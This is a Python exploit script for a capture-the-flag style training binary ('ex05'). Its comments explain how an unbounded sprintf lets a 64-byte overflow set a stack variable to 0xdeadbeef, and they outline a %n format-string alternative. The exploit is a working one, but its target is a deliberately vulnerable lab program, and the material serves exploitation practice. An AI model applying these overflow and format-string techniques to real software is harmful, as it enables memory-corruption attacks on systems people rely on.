#!/usr/bin/env python3
"""
ex05 exploit  (sprintf into a fixed buffer -> overflow an adjacent target).

vuln(char *arg):
    sub  esp, 0x68
    target = [ebp-0xc] = 0
    sprintf(buffer=[ebp-0x4c], arg)     <- arg is argv[1], used as the FORMAT
    cmp  [ebp-0xc], 0xdeadbeef          <- target must equal 0xdeadbeef

Two bugs in one: (1) `sprintf(buf, arg)` uses attacker input as the *format*
string (format-string bug), and (2) it writes into a fixed 64-byte buffer with
no bound. Because a plain string contains no `%`, sprintf copies it verbatim, so
the simplest exploit is a straight overflow: 64 filler bytes then 0xdeadbeef.

Offset buffer -> target = (ebp-0xc) - (ebp-0x4c) = 0x40 = 64 bytes.
0xdeadbeef little-endian = bytes ef be ad de (no NUL -> survives argv).

Usage (VM):   /opt/hole-in-bin/ex05/bin "$(python3 ex05.py)"
Local:        scripts/runlocal.sh challenges/ex05/bin "$(python3 scripts/ex05.py)"

Bonus — format-string alternative (see README): with ASLR off and the fixed
stack address of `target`, one can instead write 0xdeadbeef using `%n`/`%hn`
without overflowing, e.g. address + width padding + two `%hn` short writes.
"""
import struct
import sys

OFFSET = 64
payload = b"A" * OFFSET + struct.pack("<I", 0xDEADBEEF)
sys.stdout.buffer.write(payload)
